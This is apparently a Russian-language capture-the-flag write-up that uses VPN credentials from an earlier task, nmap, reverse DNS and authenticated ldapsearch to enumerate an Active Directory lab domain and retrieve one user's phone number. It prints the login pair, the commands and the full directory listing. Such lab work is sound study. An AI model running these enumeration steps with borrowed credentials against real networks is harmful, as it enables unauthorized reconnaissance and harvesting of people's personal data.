---
attack: ldap
---
Узнайте номер телефона пользователя Gerard Rodriquez.
 

#### Решение


Для начало скачиваем впн  из прошлого задания и включаем его В качестве логина и пароля 
такой r_andrews dancer
r_andrews dancer


Из логов впн вычленяем нужный нам котролер днс  10.154.16.134
```
2024-08-31 11:00:03 us=378966 PUSH: Received control message: 'PUSH_REPLY,dhcp-option DNS 10.154.16.134,route 10.154.16.0 255.255.254.0,route-gateway 10.154.17.1,topology subnet,ping 10,ping-restart 120,ifconfig 10.154.17.5 255.255.255.224,peer-id 0,cipher AES-256-GCM'

```
и чекаем порты 

```
nmap -Pn 10.154.16.134
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-01 03:31 EDT
Nmap scan report for 10.154.16.134
Host is up (0.014s latency).
Not shown: 935 filtered tcp ports (no-response), 55 closed tcp ports (conn-refused)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

```

Обратный резолв
Спрашиваю у этого домена его личность 
```
nslookup 10.154.16.134  10.154.16.134 
134.16.154.10.in-addr.arpa      name = dc.edu.stf.
```

обращаясь к ldap вытягиваем информацию 
имя берем из почты = Infra3
```
ldapsearch -x -H ldap://10.154.16.134 -D "CN=Ralf Andrews,CN=Users,DC=edu,DC=stf" -W -b "DC=edu,DC=stf" "(objectClass=user)" *
```

```
ldapsearch -x -H ldap://10.154.16.134 -D "CN=Ralf Andrews,CN=Users,DC=edu,DC=stf" -W -b "CN=g_rodriquez,OU=Operators department,OU=Departments,DC=edu,DC=stf" "(objectClass=*)" telephoneNumber mobile pager
```

```
ldapsearch -x -H ldap://10.154.16.134 -D "CN=Ralf Andrews,CN=Users,DC=edu,DC=stf" -W -b "DC=edu,DC=stf" "(objectClass=user)" *
Enter LDAP Password: 
# extended LDIF
#
# LDAPv3
# base <DC=edu,DC=stf> with scope subtree
# filter: (objectClass=user)
# requesting: codeby234.conf competitive_WE5TW3R.ovpn https://t.me/+1BMDavDH73o4ODUy.ovpn vpn-3.ovpn wg-quick up codeby234 
#

# Administrator, Users, edu.stf
dn: CN=Administrator,CN=Users,DC=edu,DC=stf

# Guest, Users, edu.stf
dn: CN=Guest,CN=Users,DC=edu,DC=stf

# DefaultAccount, Users, edu.stf
dn: CN=DefaultAccount,CN=Users,DC=edu,DC=stf

# ptdadmin, Users, edu.stf
dn: CN=ptdadmin,CN=Users,DC=edu,DC=stf

# DC, Domain Controllers, edu.stf
dn: CN=DC,OU=Domain Controllers,DC=edu,DC=stf

# krbtgt, Users, edu.stf
dn: CN=krbtgt,CN=Users,DC=edu,DC=stf

# l_blackburn, Operators department, Departments, edu.stf
dn: CN=l_blackburn,OU=Operators department,OU=Departments,DC=edu,DC=stf

# s_dotson, HR department, Departments, edu.stf
dn: CN=s_dotson,OU=HR department,OU=Departments,DC=edu,DC=stf

# j_hebert, Operators department, Departments, edu.stf
dn: CN=j_hebert,OU=Operators department,OU=Departments,DC=edu,DC=stf

# t_mathis, HR department, Departments, edu.stf
dn: CN=t_mathis,OU=HR department,OU=Departments,DC=edu,DC=stf

# c_blair, Operators department, Departments, edu.stf
dn: CN=c_blair,OU=Operators department,OU=Departments,DC=edu,DC=stf

# h_morgan, IT department, Departments, edu.stf
dn: CN=h_morgan,OU=IT department,OU=Departments,DC=edu,DC=stf

# m_mcdowell, Operators department, Departments, edu.stf
dn: CN=m_mcdowell,OU=Operators department,OU=Departments,DC=edu,DC=stf

# l_shepherd, IT department, Departments, edu.stf
dn: CN=l_shepherd,OU=IT department,OU=Departments,DC=edu,DC=stf

# e_kelly, IT department, Departments, edu.stf
dn: CN=e_kelly,OU=IT department,OU=Departments,DC=edu,DC=stf

# s_moses, IT department, Departments, edu.stf
dn: CN=s_moses,OU=IT department,OU=Departments,DC=edu,DC=stf

# h_morgan_admin, IT department, Departments, edu.stf
dn: CN=h_morgan_admin,OU=IT department,OU=Departments,DC=edu,DC=stf

# l_shepherd_admin, IT department, Departments, edu.stf
dn: CN=l_shepherd_admin,OU=IT department,OU=Departments,DC=edu,DC=stf

# e_kelly_admin, IT department, Departments, edu.stf
dn: CN=e_kelly_admin,OU=IT department,OU=Departments,DC=edu,DC=stf

# s_moses_admin, IT department, Departments, edu.stf
dn: CN=s_moses_admin,OU=IT department,OU=Departments,DC=edu,DC=stf

# vpn, Service, edu.stf
dn: CN=vpn,OU=Service,DC=edu,DC=stf

# sp_admin, Service, edu.stf
dn: CN=sp_admin,OU=Service,DC=edu,DC=stf

# DC-2, Domain Controllers, edu.stf
dn: CN=DC-2,OU=Domain Controllers,DC=edu,DC=stf

# exchange, Service, edu.stf
dn: CN=exchange,OU=Service,DC=edu,DC=stf

# BACKUP, Servers, edu.stf
dn: CN=BACKUP,OU=Servers,DC=edu,DC=stf

# MSSQL, Servers, edu.stf
dn: CN=MSSQL,OU=Servers,DC=edu,DC=stf

# SHPOINT, Servers, edu.stf
dn: CN=SHPOINT,OU=Servers,DC=edu,DC=stf

# LSHEPHERD, Workstations, edu.stf
dn: CN=LSHEPHERD,OU=Workstations,DC=edu,DC=stf

# SMOSES, Workstations, edu.stf
dn: CN=SMOSES,OU=Workstations,DC=edu,DC=stf

# HMORGAN, Srv_ws, edu.stf
dn: CN=HMORGAN,OU=Srv_ws,DC=edu,DC=stf

# EKELLY, Srv_ws, edu.stf
dn: CN=EKELLY,OU=Srv_ws,DC=edu,DC=stf

# TMATHIS, Workstations, edu.stf
dn: CN=TMATHIS,OU=Workstations,DC=edu,DC=stf

# SDOTSON, Workstations, edu.stf
dn: CN=SDOTSON,OU=Workstations,DC=edu,DC=stf

# CFRAZIER, Workstations, edu.stf
dn: CN=CFRAZIER,OU=Workstations,DC=edu,DC=stf

# CBLAIR, Workstations, edu.stf
dn: CN=CBLAIR,OU=Workstations,DC=edu,DC=stf

# LBLACKBURN, Workstations, edu.stf
dn: CN=LBLACKBURN,OU=Workstations,DC=edu,DC=stf

# MMCDOWELL, Workstations, edu.stf
dn: CN=MMCDOWELL,OU=Workstations,DC=edu,DC=stf

# JHEBERT, Workstations, edu.stf
dn: CN=JHEBERT,OU=Workstations,DC=edu,DC=stf

# EXCHANGE, Exchange, edu.stf
dn: CN=EXCHANGE,OU=Exchange,DC=edu,DC=stf

# Exchange Online-ApplicationAccount, Users, edu.stf
dn: CN=Exchange Online-ApplicationAccount,CN=Users,DC=edu,DC=stf

# SystemMailbox{1f05a927-be4e-425f-a728-4eb24a89a632}, Users, edu.stf
dn: CN=SystemMailbox{1f05a927-be4e-425f-a728-4eb24a89a632},CN=Users,DC=edu,DC=
 stf

# SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c}, Users, edu.stf
dn: CN=SystemMailbox{bb558c35-97f1-4cb9-8ff7-d53741dc928c},CN=Users,DC=edu,DC=
 stf

# SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9}, Users, edu.stf
dn: CN=SystemMailbox{e0dc1c29-89c3-4034-b678-e6c29d823ed9},CN=Users,DC=edu,DC=
 stf

# DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852}, Users, edu.stf
dn: CN=DiscoverySearchMailbox {D919BA05-46A6-415f-80AD-7E09334BB852},CN=Users,
 DC=edu,DC=stf

# Migration.8f3e7716-2011-43e4-96b1-aba62d229136, Users, edu.stf
dn: CN=Migration.8f3e7716-2011-43e4-96b1-aba62d229136,CN=Users,DC=edu,DC=stf

# FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042, Users, edu.stf
dn: CN=FederatedEmail.4c1f4d8b-8179-4148-93bf-00a95fa1e042,CN=Users,DC=edu,DC=
 stf

# SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201}, Users, edu.stf
dn: CN=SystemMailbox{D0E409A0-AF9B-4720-92FE-AAC869B0D201},CN=Users,DC=edu,DC=
 stf

# SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA}, Users, edu.stf
dn: CN=SystemMailbox{2CE34405-31BE-455D-89D7-A7C7DA7A0DAA},CN=Users,DC=edu,DC=
 stf

# SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9}, Users, edu.stf
dn: CN=SystemMailbox{8cc370d3-822a-4ab8-a926-bb94bd0641a9},CN=Users,DC=edu,DC=
 stf

# HealthMailbox02152e70d5124fa0bb95186906c0d81b, Monitoring Mailboxes, Microsof
 t Exchange System Objects, edu.stf
dn: CN=HealthMailbox02152e70d5124fa0bb95186906c0d81b,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=edu,DC=stf

# HealthMailbox16f4d63e58fc40918c9f62671bf5c43e, Monitoring Mailboxes, Microsof
 t Exchange System Objects, edu.stf
dn: CN=HealthMailbox16f4d63e58fc40918c9f62671bf5c43e,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=edu,DC=stf

# HealthMailbox8f46d57707c5484f858a646207b95e59, Monitoring Mailboxes, Microsof
 t Exchange System Objects, edu.stf
dn: CN=HealthMailbox8f46d57707c5484f858a646207b95e59,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=edu,DC=stf

# HealthMailbox6e2c32a1aa8b484095d15c22c15e7e4c, Monitoring Mailboxes, Microsof
 t Exchange System Objects, edu.stf
dn: CN=HealthMailbox6e2c32a1aa8b484095d15c22c15e7e4c,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=edu,DC=stf

# HealthMailboxa3df24edcb7d4e54bc0689860513e500, Monitoring Mailboxes, Microsof
 t Exchange System Objects, edu.stf
dn: CN=HealthMailboxa3df24edcb7d4e54bc0689860513e500,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=edu,DC=stf

# HealthMailbox0d7656f4d87140b69da8b8c77ce1cab8, Monitoring Mailboxes, Microsof
 t Exchange System Objects, edu.stf
dn: CN=HealthMailbox0d7656f4d87140b69da8b8c77ce1cab8,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=edu,DC=stf

# HealthMailboxb7326a7976d443d2b3dd35c2bc81590c, Monitoring Mailboxes, Microsof
 t Exchange System Objects, edu.stf
dn: CN=HealthMailboxb7326a7976d443d2b3dd35c2bc81590c,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=edu,DC=stf

# HealthMailbox76f2f356b1324548855aca203198774d, Monitoring Mailboxes, Microsof
 t Exchange System Objects, edu.stf
dn: CN=HealthMailbox76f2f356b1324548855aca203198774d,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=edu,DC=stf

# HealthMailbox05d53f7d85b5403687212ab66a2c37be, Monitoring Mailboxes, Microsof
 t Exchange System Objects, edu.stf
dn: CN=HealthMailbox05d53f7d85b5403687212ab66a2c37be,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=edu,DC=stf

# HealthMailbox5782d38e97cf40e4a2889c073875de81, Monitoring Mailboxes, Microsof
 t Exchange System Objects, edu.stf
dn: CN=HealthMailbox5782d38e97cf40e4a2889c073875de81,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=edu,DC=stf

# HealthMailbox74bcea7372934362a4b9eb6312f71ee5, Monitoring Mailboxes, Microsof
 t Exchange System Objects, edu.stf
dn: CN=HealthMailbox74bcea7372934362a4b9eb6312f71ee5,CN=Monitoring Mailboxes,C
 N=Microsoft Exchange System Objects,DC=edu,DC=stf

# GRODRIQUEZ, Workstations, edu.stf
dn: CN=GRODRIQUEZ,OU=Workstations,DC=edu,DC=stf

# MHOLDEN, Workstations, edu.stf
dn: CN=MHOLDEN,OU=Workstations,DC=edu,DC=stf

# m_holden, Top management, Departments, edu.stf
dn: CN=m_holden,OU=Top management,OU=Departments,DC=edu,DC=stf

# g_rodriquez, Operators department, Departments, edu.stf
dn: CN=g_rodriquez,OU=Operators department,OU=Departments,DC=edu,DC=stf

# gitlab, Service, edu.stf
dn: CN=gitlab,OU=Service,DC=edu,DC=stf

# Ralf Andrews, Users, edu.stf
dn: CN=Ralf Andrews,CN=Users,DC=edu,DC=stf

# sharepoint_spn, Users, edu.stf
dn: CN=sharepoint_spn,CN=Users,DC=edu,DC=stf

# getmailflag, Users, edu.stf
dn: CN=getmailflag,CN=Users,DC=edu,DC=stf

# frazier, HR department, Departments, edu.stf
dn: CN=frazier,OU=HR department,OU=Departments,DC=edu,DC=stf

# search reference
ref: ldap://ForestDnsZones.edu.stf/DC=ForestDnsZones,DC=edu,DC=stf

# search reference
ref: ldap://DomainDnsZones.edu.stf/DC=DomainDnsZones,DC=edu,DC=stf

# search reference
ref: ldap://edu.stf/CN=Configuration,DC=edu,DC=stf

# search result
search: 2
result: 0 Success

# numResponses: 73
# numEntries: 69
# numReferences: 3

```


```
                                                                                                                                                                      
┌──(kali㉿kali)-[~/VPN]
└─$ ldapsearch -x -H ldap://10.154.16.134 -D "CN=Ralf Andrews,CN=Users,DC=edu,DC=stf" -W -b "CN=g_rodriquez,OU=Operators department,OU=Departments,DC=edu,DC=stf" "(objectClass=*)" telephoneNumber mobile pager
Enter LDAP Password: 
# extended LDIF
#
# LDAPv3
# base <CN=g_rodriquez,OU=Operators department,OU=Departments,DC=edu,DC=stf> with scope subtree
# filter: (objectClass=*)
# requesting: telephoneNumber mobile pager 
#

# g_rodriquez, Operators department, Departments, edu.stf
dn: CN=g_rodriquez,OU=Operators department,OU=Departments,DC=edu,DC=stf
telephoneNumber: 8-777-112-99-25

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
                   
```